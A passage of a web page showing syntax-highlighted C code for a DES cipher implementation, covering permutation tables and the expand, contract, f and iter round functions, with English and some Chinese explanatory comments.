class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span>  <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span>   <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span>   <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>   <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">25</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> rp32i<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>   <span class="token comment">/* reverse P in F(DC) */</span>   <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span>  <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span>  <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>   <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>   <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span>  <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>   <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">21</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> bytebit<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>      <span class="token comment">/* bit 0 is left-most in byte */</span>  <span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token number">0x4</span><span class="token punctuation">,</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0x1</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> nibblebit<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0x8</span><span class="token punctuation">,</span><span class="token number">0x4</span><span class="token punctuation">,</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0x1</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment">//这些位模式可能用于检查输入四位值中的特定位是否为1</span><span class="token comment">/* permute inblock with perm, result into outblock,64 bits */</span><span class="token keyword">void</span> <span class="token function">permute</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>inblock<span class="token punctuation">,</span>             <span class="token keyword">unsigned</span> <span class="token keyword">char</span> perm<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment">/* 2K bytes defining perm.  */</span>             <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>outblock<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>  <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>ib<span class="token punctuation">,</span> <span class="token operator">*</span>ob<span class="token punctuation">,</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token operator">*</span>q<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> ob<span class="token operator">=</span>outblock<span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">/* clear output block    */</span> <span class="token comment">//这个循环用于将输出数据块的每个字节都初始化为0，即清空输出块。</span>  ib <span class="token operator">=</span> inblock<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> j <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">,</span> ib<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">/* for each input nibble  */</span>    ob <span class="token operator">=</span> outblock<span class="token punctuation">;</span>    p <span class="token operator">=</span> perm<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">*</span>ib <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    q <span class="token operator">=</span> perm<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span>ib <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token comment">/* and each output byte  */</span>      <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">|=</span> <span class="token operator">*</span>p<span class="token operator">++</span> <span class="token operator">|</span> <span class="token operator">*</span>q<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token comment">/* OR the masks together*/</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">/* 32-bit permutation at end of the f crypto function*/</span><span class="token keyword">void</span> <span class="token function">perm32</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> inblock<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token keyword">unsigned</span> <span class="token keyword">char</span> perm<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token keyword">unsigned</span> <span class="token keyword">char</span> outblock<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span>  <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>ib<span class="token punctuation">,</span> <span class="token operator">*</span>ob<span class="token punctuation">,</span> <span class="token operator">*</span>q<span class="token punctuation">;</span>  ob <span class="token operator">=</span> outblock<span class="token punctuation">;</span>       <span class="token comment">/* clear output block */</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  ib <span class="token operator">=</span> inblock<span class="token punctuation">;</span>        <span class="token comment">/* ptr to 1st byte of input */</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">,</span> ib<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">/* for each input byte */</span>    q <span class="token operator">=</span> perm<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span>ib <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ob <span class="token operator">=</span> outblock<span class="token punctuation">;</span>    <span class="token comment">/* and each output byte */</span>    <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">|=</span> <span class="token operator">*</span>q<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token comment">/* OR the 16 masks together */</span>    <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">|=</span> <span class="token operator">*</span>q<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">|=</span> <span class="token operator">*</span>q<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">|=</span> <span class="token operator">*</span>q<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">/* 32 to 48 bits with E oper, right is 32, bigright 48  */</span><span class="token keyword">void</span> <span class="token function">expand</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> right<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> bigright<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>bb<span class="token punctuation">,</span> <span class="token operator">*</span>r<span class="token punctuation">,</span> r0<span class="token punctuation">,</span> r1<span class="token punctuation">,</span> r2<span class="token punctuation">,</span> r3<span class="token punctuation">;</span>  bb <span class="token operator">=</span> bigright<span class="token punctuation">;</span>  r <span class="token operator">=</span> right<span class="token punctuation">;</span> r0 <span class="token operator">=</span> <span class="token operator">*</span>r<span class="token operator">++</span><span class="token punctuation">;</span> r1 <span class="token operator">=</span> <span class="token operator">*</span>r<span class="token operator">++</span><span class="token punctuation">;</span> r2 <span class="token operator">=</span> <span class="token operator">*</span>r<span class="token operator">++</span><span class="token punctuation">;</span> r3 <span class="token operator">=</span> <span class="token operator">*</span>r<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>r3 <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">|</span>  <span class="token comment">/* 32             */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r0 <span class="token operator">&amp;</span> <span class="token number">0xf8</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span>       <span class="token comment">/* 1 2 3 4 5      */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r0 <span class="token operator">&amp;</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* 4 5            */</span>  <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>r0 <span class="token operator">&amp;</span> <span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">|</span>  <span class="token comment">/* 6 7 8          */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r1 <span class="token operator">&amp;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span>       <span class="token comment">/* 9              */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r0 <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span>        <span class="token comment">/* 8              */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r1 <span class="token operator">&amp;</span> <span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* 9 10 11        */</span>  <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>r1 <span class="token operator">&amp;</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token comment">/* 12 13          */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r1 <span class="token operator">&amp;</span> <span class="token number">0x1f</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span>       <span class="token comment">/* 12 13 14 15 16 */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r2 <span class="token operator">&amp;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* 17             */</span>  <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>r1 <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">|</span>  <span class="token comment">/* 16             */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r2 <span class="token operator">&amp;</span> <span class="token number">0xf8</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span>       <span class="token comment">/* 17 18 19 20 21 */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r2 <span class="token operator">&amp;</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* 20 21          */</span>  <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>r2 <span class="token operator">&amp;</span> <span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">|</span>  <span class="token comment">/* 22 23 24       */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r3 <span class="token operator">&amp;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span>       <span class="token comment">/* 25             */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r2 <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span>        <span class="token comment">/* 24             */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r3 <span class="token operator">&amp;</span> <span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* 25 26 27       */</span>  <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>r3 <span class="token operator">&amp;</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token comment">/* 28 29          */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r3 <span class="token operator">&amp;</span> <span class="token number">0x1f</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span>       <span class="token comment">/* 28 29 30 31 32 */</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span>r0 <span class="token operator">&amp;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* 1              */</span><span class="token punctuation">}</span><span class="token comment">/* contract f from 48 to 32 bits, using 12-bit pieces into bytes */</span><span class="token keyword">void</span> <span class="token function">contract</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> in48<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> out32<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>c<span class="token punctuation">;</span>  <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>i<span class="token punctuation">;</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i0<span class="token punctuation">,</span> i1<span class="token punctuation">,</span> i2<span class="token punctuation">,</span> i3<span class="token punctuation">,</span> i4<span class="token punctuation">,</span> i5<span class="token punctuation">;</span>  i <span class="token operator">=</span> in48<span class="token punctuation">;</span>  i0 <span class="token operator">=</span> <span class="token operator">*</span>i<span class="token operator">++</span><span class="token punctuation">;</span> i1 <span class="token operator">=</span> <span class="token operator">*</span>i<span class="token operator">++</span><span class="token punctuation">;</span> i2 <span class="token operator">=</span> <span class="token operator">*</span>i<span class="token operator">++</span><span class="token punctuation">;</span> i3 <span class="token operator">=</span> <span class="token operator">*</span>i<span class="token operator">++</span><span class="token punctuation">;</span> i4 <span class="token operator">=</span> <span class="token operator">*</span>i<span class="token operator">++</span><span class="token punctuation">;</span> i5 <span class="token operator">=</span> <span class="token operator">*</span>i<span class="token operator">++</span><span class="token punctuation">;</span>  c <span class="token operator">=</span> out32<span class="token punctuation">;</span>      <span class="token comment">/* do output a byte at a time   */</span>  <span class="token operator">*</span>c<span class="token operator">++</span> <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0xfff</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i1 <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token operator">*</span>c<span class="token operator">++</span> <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0xfff</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i1 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span> i2  <span class="token operator">&amp;</span> <span class="token number">0xff</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token operator">*</span>c<span class="token operator">++</span> <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0xfff</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i3 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i4 <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token operator">*</span>c<span class="token operator">++</span> <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0xfff</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i4 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span> i5  <span class="token operator">&amp;</span> <span class="token number">0xff</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* critical cryptographic trans, num: index number of this iter */</span><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> right<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> fret<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>kb<span class="token punctuation">,</span> <span class="token operator">*</span>rb<span class="token punctuation">,</span> <span class="token operator">*</span>bb<span class="token punctuation">;</span>  <span class="token comment">/* ptr to key selection &amp;c  */</span>  <span class="token keyword">char</span> bigright<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* right expanded to 48 bits  */</span>  <span class="token keyword">char</span> result<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">/* expand(R) XOR keyselect[num] */</span>  <span class="token keyword">char</span> preout<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">/* result of 32-bit permutation */</span>  kb <span class="token operator">=</span> kn<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">/* fast version of iteration  */</span>  bb <span class="token operator">=</span> bigright<span class="token punctuation">;</span>  rb <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token function">expand</span><span class="token punctuation">(</span>right<span class="token punctuation">,</span>bb<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* expand to 48 bits    */</span>  <span class="token operator">*</span>rb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>kb<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token comment">/* expanded R XOR chunk of key  */</span>  <span class="token operator">*</span>rb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>kb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>rb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>kb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>rb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>kb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>rb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>kb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>rb<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>bb<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>kb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token function">contract</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span>preout<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">/* use S fns to get 32 bits  */</span>  <span class="token function">perm32</span><span class="token punctuation">(</span>preout<span class="token punctuation">,</span> p32<span class="token punctuation">,</span> fret<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* and do final 32-bit perm  */</span><span class="token punctuation">}</span><span class="token comment">/* 1 churning operation, num: i.e. the num-th one */</span><span class="token keyword">void</span> <span class="token function">iter</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> inblock<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> outblock<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>  <span class="token keyword">char</span> fret<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">/* return from f(R[i-1],key)  */</span>  <span class="token keyword">register</span> <span class="token keyword">char</span> <span class="token operator">*</span>ib<span class="token punctuation">,</span> <span class="token operator">*</span>ob<span class="token punctuation">,</span> <span class="token operator">*</span>fb<span class="token punctuation">;</span>  ob <span class="token operator">=</span> outblock<span class="token punctuation">;</span> ib <span class="token operator">=</span> <span class="token operator">&amp;</span>inblock<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">f</span><span class="token punctuation">(</span>ib<span class="token punctuation">,</span> num<span class="token punctuation">,</span> fret<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* the primary transformation   */</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token comment">/* L[i] = R[i-1]    */</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span><span class="token punctuation">;</span>  ib <span class="token operator">=</span> inblock<span class="token punctuation">;</span> fb <span class="token operator">=</span> fret<span class="token punctuation">;</span>  <span class="token comment">/* R[i]=L[i] XOR f(R[i-1],key)  */</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span> <span class="token operator">^</span> <span class="token operator">*</span>fb<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token operator">*</span>ob<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>ib<span class="token operator">++</span> <span class="token operator">^</span> <span class="token 